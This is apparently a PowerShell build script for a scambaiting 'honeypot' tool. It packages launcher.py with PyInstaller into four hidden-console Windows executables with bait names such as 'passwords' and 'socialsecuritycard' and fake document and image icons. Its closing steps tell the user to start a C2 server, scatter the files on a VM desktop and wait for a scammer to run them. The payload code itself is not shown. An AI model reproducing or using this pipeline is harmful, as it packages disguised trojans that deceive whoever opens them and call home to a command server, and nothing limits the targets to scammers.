# Build Anytime Payload - Multi-Variant Builder
# Generates 4 honeypot variants with different names and icons
# Usage: .\build.ps1
#        .\build.ps1 -Dev (builds with visible console for debugging)

param(
    [switch]$Dev
)

# Define all variants to build
$variants = @(
    @{ Name = "passwords"; Icon = "assets\text.ico" },
    @{ Name = "BankOfAmerica_Recovery_Codes"; Icon = "assets\text.ico" },
    @{ Name = "socialsecuritycard"; Icon = "assets\image1.ico" },
    @{ Name = "Credit_Card_Photos"; Icon = "assets\image2.ico" }
)

if ($Dev) {
    Write-Host ""
    Write-Host "======================================"
    Write-Host "  Anytime Payload Builder (DEV MODE)"
    Write-Host "======================================"
    Write-Host ""
    Write-Host "Building $($variants.Count) variants with VISIBLE console..." -ForegroundColor Yellow
    Write-Host ""
} else {
    Write-Host ""
    Write-Host "======================================"
    Write-Host "  Anytime Payload Builder"
    Write-Host "======================================"
    Write-Host ""
    Write-Host "Building $($variants.Count) honeypot variants..." -ForegroundColor Cyan
    Write-Host ""
}

# ============================================
# CLEAN PREVIOUS BUILD
# ============================================

if (Test-Path "dist") {
    Write-Host "Cleaning previous build..." -ForegroundColor Cyan
    Remove-Item "dist" -Recurse -Force
    Write-Host "  -> dist/ folder cleaned" -ForegroundColor Gray
}

Write-Host ""

# ============================================
# PRE-BUILD CHECKS
# ============================================

# Check required files
if (!(Test-Path "launcher.py")) {
    Write-Host "ERROR: launcher.py not found!" -ForegroundColor Red
    exit 1
}

# Check all icon files exist
foreach ($variant in $variants) {
    if (!(Test-Path $variant.Icon)) {
        Write-Host "ERROR: Icon not found: $($variant.Icon)" -ForegroundColor Red
        exit 1
    }
}

# Find Python
$python = "python"
if (!(Get-Command python -ErrorAction SilentlyContinue)) {
    $python = "python3"
    if (!(Get-Command python3 -ErrorAction SilentlyContinue)) {
        Write-Host "ERROR: Python not found!" -ForegroundColor Red
        exit 1
    }
}

# Check PyInstaller
& $python -m pip show pyinstaller >$null 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Host "  PyInstaller not found. Installing..." -ForegroundColor Yellow
    & $python -m pip install pyinstaller
    if ($LASTEXITCODE -ne 0) {
        Write-Host "ERROR: Failed to install PyInstaller" -ForegroundColor Red
        exit 1
    }
}

Write-Host "Pre-build checks passed" -ForegroundColor Green
Write-Host ""

# ============================================
# BUILD ALL VARIANTS
# ============================================

$buildCount = 0
foreach ($variant in $variants) {
    $buildCount++
    Write-Host "[$buildCount/$($variants.Count)] Building $($variant.Name).exe..." -ForegroundColor Cyan
    
    # Build with PyInstaller (with or without console depending on dev mode)
    if ($Dev) {
        & $python -m PyInstaller `
            --onefile `
            --console `
            --icon="$($variant.Icon)" `
            --name="$($variant.Name)" `
            --add-data=".\assets;assets" `
            --distpath=dist `
            --workpath=build `
            --specpath=build `
            launcher.py
    } else {
        & $python -m PyInstaller `
            --onefile `
            --noconsole `
            --icon="$($variant.Icon)" `
            --name="$($variant.Name)" `
            --add-data=".\assets;assets" `
            --distpath=dist `
            --workpath=build `
            --specpath=build `
            launcher.py
    }
    
    if ($LASTEXITCODE -ne 0) {
        Write-Host "  ERROR: Build failed for $($variant.Name)!" -ForegroundColor Red
        exit 1
    }
    
    Write-Host "  -> dist\$($variant.Name).exe created" -ForegroundColor Green
}

Write-Host ""

# Create or remove .dev_mode marker (only once for all builds)
if ($Dev) {
    New-Item -ItemType File -Path "dist\.dev_mode" -Force | Out-Null
    Write-Host "  -> Created .dev_mode marker" -ForegroundColor Cyan
} else {
    if (Test-Path "dist\.dev_mode") {
        Remove-Item "dist\.dev_mode" -Force
    }
}

# Clean up build artifacts
if (Test-Path "build") { Remove-Item "build" -Recurse -Force }
if (Test-Path "__pycache__") { Remove-Item "__pycache__" -Recurse -Force }
Write-Host "  -> Build artifacts cleaned" -ForegroundColor Gray

# ============================================
# DONE
# ============================================

Write-Host ""
Write-Host "======================================"
if ($Dev) {
    Write-Host "  Dev Build Complete!"
} else {
    Write-Host "  Build Complete!"
}
Write-Host "======================================"
Write-Host ""

if ($Dev) {
    Write-Host "All variants built with VISIBLE console for debugging:" -ForegroundColor Yellow
} else {
    Write-Host "All honeypot variants built successfully:" -ForegroundColor Green
}
Write-Host ""

foreach ($variant in $variants) {
    Write-Host "  -> dist\$($variant.Name).exe" -ForegroundColor Cyan
}

Write-Host ""
Write-Host "Next steps:"
Write-Host "  1. Start C2 server: cd ..\sender && python sender.py"
if ($Dev) {
    Write-Host "  2. Run any variant to see debug output (console visible)"
} else {
    Write-Host "  2. Deploy all 4 variants to honeypot VM desktop"
    Write-Host "  3. Scatter them naturally (don't cluster together)"
    Write-Host "  4. Wait for scammer to copy and execute"
}
Write-Host ""
